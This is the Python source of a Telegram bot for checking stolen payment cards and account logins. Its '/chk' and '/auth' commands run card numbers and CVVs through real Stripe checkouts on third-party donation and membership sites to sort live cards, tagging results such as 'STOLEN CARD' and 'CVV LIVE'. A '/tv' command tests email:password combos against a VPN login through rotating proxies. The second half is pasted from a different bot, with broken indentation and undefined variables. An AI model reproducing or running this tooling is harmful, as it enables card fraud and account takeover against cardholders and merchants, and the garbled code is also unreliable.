import logging
import os
import requests
import time
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup

ENV = bool(os.environ.get('ENV', True))
TOKEN = os.environ.get("TOKEN", None)
BLACKLISTED = os.environ.get("BLACKLISTED", None) 
PREFIX = "!/"

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)

###USE YOUR ROTATING PROXY### NEED HQ PROXIES ELSE WONT WORK UPDATE THIS FILED
r = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=20&country=all&ssl=all&anonymity=all&simplified=true').text
res = r.partition('\n')[0]
proxy = {"http": f"http://{res}"}
session = requests.session()

session.proxies = proxy #UNCOMMENT IT AFTER PROXIES

#random str GEN FOR EMAIL
N = 10
rnd = ''.join(random.choices(string.ascii_lowercase +
                                string.digits, k = N))


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    await message.reply(
        "Hello how to use <code>/chk cc/mm/yy/cvv</code><code>/auth cc/mm/yy/cvv</code>\nREPO <a href='https://github.com/Sarcehkr/GreatMarBot'>Here</a>"
    )
    

@dp.message_handler(commands=['tv'], commands_prefix=PREFIX)
async def tv(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    ac = message.text[len('/tv '):]
    splitter = ac.split(':')
    email = splitter[0]
    password = splitter[1]
    if not ac:
        return await message.reply(
            "<code>Send ac /tv email:pass.</code>"
        )
    payload = {
        "username": email,
        "password": password,
        "withUserDetails": "true",
        "v": "web-1.0"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    r = session.post("https://prod-api-core.tunnelbear.com/core/web/api/login",
                     data=payload, headers=headers)
    toc = time.perf_counter()
    
    # capture ac details
    if "Access denied" in r.text:
        await message.reply(f"""
<b>COMBO</b>➟ <code>{ac}</code>
<b>STATUS</b>➟ ❌WRONG DETAILS
TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    elif "PASS" in r.text:
        res = r.json()
        await message.reply(f"""
<b>COMBO</b>➟ <code>{ac}</code>
<b>STATUS</b>➟ ✅VALID
<b>LEVEL</b>➟ {res['details']['bearType']}
<b>VALIDTILL</b>➟ {res['details']['fullVersionUntil']}
TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    else:
        await message.reply("Error❌: REQ failed")
        
        
@dp.message_handler(commands=["bin"], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("Send bin not ass")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    r = requests.get(f"https://bins.ws/search?bins={BIN}&bank=&country=").text
    soup = BeautifulSoup(r, features="html.parser")
    k = soup.find("div", {"class": "page"})
    INFO = f"""
═════════╕
<b>BIN INFO</b>
<code>{k.get_text()[62:]}</code>
CheckedBy: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot:</b> @GreatMarBot
╘═════════
"""
    await message.reply(INFO)
        
    
@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    cc = message.text[len('/chk '):]
    splitter = cc.split('|')
    ccn = splitter[0]
    mm = splitter[1]
    yy = splitter[2]
    cvv = splitter[3]
    email = f"{str(rnd)}@gmail.com"
    if not cc:
        return await message.reply(
            "<code>Send Card /chk cc|mm|yy|cvv.</code>"
        )   
    BIN = cc[:6]
    if BIN in BLACKLISTED:
        return await message.reply(
            "<b>BLACKLISTED BIN</b>"
            )
    # get guid muid sid
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    s = session.post("https://m.stripe.com/6",
                     headers=headers)
    r = s.json()
    Guid = r["guid"]
    Muid = r["muid"]
    Sid = r["sid"]
    
    # now 1 req
    payload = {
      "lang": "en",
      "type": "donation",
      "currency": "USD",
      "amount": "5",
      "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
      "currencySign": "$"
    }
    
    head = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "*/*",
      "Origin": "https://adblockplus.org",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://adblockplus.org/",
      "Accept-Language": "en-US,en;q=0.9"
    }
    
    re = session.post("https://new-integration.adblockplus.org/",
                     data=payload, headers=head)
    client = re.text
    pi = client[0:27]
    
    #hmm
    load = {
      "receipt_email": email,
      "payment_method_data[type]": "card",
      "payment_method_data[billing_details][email]": email,
      "payment_method_data[card][number]": ccn,
      "payment_method_data[card][cvc]": cvv,
      "payment_method_data[card][exp_month]": mm,
      "payment_method_data[card][exp_year]": yy,
      "payment_method_data[guid]": Guid,
      "payment_method_data[muid]": Muid,
      "payment_method_data[sid]": Sid,
      "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
      "payment_method_data[referrer]": "https://adblockplus.org/",
      "expected_payment_method_type": "card",
      "use_stripe_sdk": "true",
      "webauthn_uvpa_available": "true",
      "spc_eligible": "false",
      "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
      "client_secret": client
    }
    
    header = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "application/json",
      "Origin": "https://js.stripe.com",
      "Referer": "https://js.stripe.com/",
      "Accept-Language": "en-US,en;q=0.9"
    }
    
    rx = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
                     data=load, headers=header)
    res = rx.json()
    msg = res["error"]["message"]
    toc = time.perf_counter()
    if "incorrect_cvc" in rx.text:
        await message.reply(f"""
✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    elif "Unrecognized request URL" in rx.text:
        await message.reply("[UPDATE] PROXIES ERROR")
    elif rx.status_code == 200:
        await message.reply(f"""
✔️<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    else:
        await message.reply(f"""
❌<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")

@dp.message_handler(commands=['auth'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    cc = message.text[len('/auth '):]
    splitter = cc.split('|')
    ccn = splitter[0]
    mm = splitter[1]
    yy = splitter[2]
    cvv = splitter[3]
    email = f"{str(rnd)}@gmail.com"
    if not cc:
        return await message.reply(
            "<code>Send Card /auth cc|mm|yy|cvv.</code>"
        )   
    BIN = cc[:6]
    if BIN in BLACKLISTED:
        return await message.reply(
            "<b>BLACKLISTED BIN</b>"
            )
                                            data = {
'type':'card',
'billing_details[name]': first_name + last_name,
'card[number]': cc,
'card[cvc]': cvv,
'card[exp_month]': mes,
'card[exp_year]': ano,
'guid':'c1bd35ac-16ac-497d-b9e9-08d8d6b6dd78a9f288',
'muid':'3e2a21b8-9f23-4815-b0e0-57cc7181d36d745712',
'sid':'e670519e-729a-41b8-90e9-217f2246a7bda5c3be',
'pasted_fields':'number',
'payment_user_agent':'stripe.js/7338eae82; stripe-js-v3/7338eae82',
'time_on_page':'40188',
'key':'pk_live_D6OrW2B1US3IQIrEjWHyONBU00urQMsXJS',
                                }
                                res = curl.post("https://api.stripe.com/v1/payment_methods",headers=sk_headers,data=data)
                                   json_first = json.loads(res.text)
                                if 'error' in json_first:
                                    text =
                                    f"""
<b>〄</b> GATE: <b>STRIPE AUTH [9]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    antidb.set(message.from_user.id, int(time.time()))
                                elif 'id' not in json_first:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [9]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [ERROR]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    antidb.set(message.from_user.id, int(time.time()))
                                else:
                                    id = json_first["id"]
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [9]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    headers = {
                                    "authority": "haitianprofessionals.org",
                                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
                                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                                    "content-type": "application/x-www-form-urlencoded",
                                    "cookie": "PHPSESSID=a456c9258fbb345f66f14f8dbab643c6",
                                    "origin": "https://haitianprofessionals.org",
                                    "referer": "https://haitianprofessionals.org/membership-account-2/membership-checkout/",
                                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                                    }
                                    data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&bemail={email}&bconfirmemail_copy=1&fullname=&date_of_birth%5Bm%5D=4&date_of_birth%5Bd%5D=22&date_of_birth%5By%5D=2000&option3_checkbox=1&gender=male&how_hear=facebook&autorenew_present=1&bfirstname={first_name}&blastname={last_name}&baddress1={street}&baddress2=&bcity={city}&bstate={state}&bzipcode={zip}&bcountry=US&bphone=2253687536&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
                                    res = curl.post("https://haitianprofessionals.org/membership-account-2/membership-checkout/",headers=headers,data=data)
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [9]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    try:
                                        if 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'The zip code you supplied failed validation' in res.text or 'card zip code is incorrect' in res.text: 
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #ZIP")
                                            response = "CVV LIVE"
                                            r_logo = "✅"
                                            r_text = 'ZIP INCORRECT'
                                        elif '"cvc_check":"pass"' in res.text or '"cvc_check":"success"' in res.text or "Thank You." in res.text or '"status": "succeeded"' in res.text or "Thank You For Donation." in res.text or "Your payment has already been processed" in res.text or "Success " in res.text or '"type":"one-time"' in res.text or "/donations/thank_you?donation_number=" in res.text or '"status": "complete"' in res.text or '"status": "cahrged"' in res.text or '"status": "suceess"' in res.text or '"status": "thanks"' in res.text or '"status": "successufulty"' in res.text or '"status": "thaks for your donation."' in res.text or '"status": "save"' in res.text or '"status": "pass"' in res.text or '"status": "true"' in res.text or '"status": "valid"' in res.text or '"status": "null"' in res.text or '"status": "complete"' in res.text or '"status": "validated"' in res.text or '"status": "successufll"' in res.text or '"status": "succefulity"' in res.text or "Payment complete" in res.text or '"cvc_check": "complete"' in res.text or '"cvc_check": "cahrged"' in res.text or '"cvc_check": "suceess"' in res.text or '"cvc_check": "thanks"' in res.text or '"cvc_check": "successufulty"' in res.text or '"cvc_check": "thaks for your donation."' in res.text or '"cvc_check": "save"' in res.text or '"cvc_check": "pass"' in res.text or '"cvc_check": "true"' in res.text or '"cvc_check": "valid"' in res.text or '"cvc_check": "null"' in res.text or '"cvc_check": "complete"' in res.text or '"cvc_check": "validated"' in res.text or '"cvc_check": "successufll"' in res.text or '"cvc_check": "succefulity"' in res.text or "Payment complete" in res.text or "fraudulent, LIVE" in res.text or "cvv_charged" in res.text or "cvv_not_charged" in res.text or '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text or 'donation_number=' in res.text : #or 'donation_number=' in res.text
                                            save_live(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "CVV MATCH"                                            
                                        elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
                                            save_live(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " Insufficient")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "LOW BALANCE"
                                        elif "pickup_card" in res.text or 'Pickup Card' in res.text or 'pickup card' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "PICKUP CARD"
                                        elif "stolen_card" in res.text or 'stolen Card' in res.text or 'stolen card' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "STOLEN CARD"
                                        elif "lost_card" in res.text or 'Lost Card' in res.text or 'lost card' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "LOST CARD"
                                        elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
                                            save_ccn(lista)
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #CCN")
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "CVC MISMATCH"
                                        elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text: 
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "PURCHASE NOT ALLOWED"
                                        elif "card number is incorrect" in res.text or 'incorrect_number' in res.text or 'Invalid Credit Card Number' in res.text or 'card number is incorrect' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD INCORRECT"
                                        elif "Customer authentication is required" in res.text or "unable to authenticate" in res.text or "three_d_secure_redirect" in res.text or "hooks.stripe.com/redirect/" in res.text or 'requires an authorization' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "3D SECURITY"
                                        elif "card was declined" in res.text or 'card_declined' in res.text or 'The transaction has been declined' in res.text or 'Processor Declined' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD DECLINED"
                                        elif 'Do Not Honor' in res.text :
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "NO NOT HONOR"
                                        elif "card has expired" in res.text or 'Expired Card' in res.text:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD EXPIRED"
                                        else:
                                            response = 'ERROR'
                                            r_logo = '❌'
                                            r_text = 'UNKOWN RESPONSE'  
                                    except Exception as e:
                                        await Client.send_message(chat_id=loggp, text=e)
                                    else:
                                        if response is None:
                                            await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                        else:
                                            credits = find['credits']
                                            credits_left = credits - 2
                                            maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)
                                            lasttext = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [9]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>{response}{r_logo} [{r_text}]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> CREDIT LEFT: {credits_left}
<b>○</b> TIME TAKEN: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                            await msg.edit_text(lasttext)
                                            antidb.set(message.from_user.id, int(time.time()))
    
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)

    
    
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
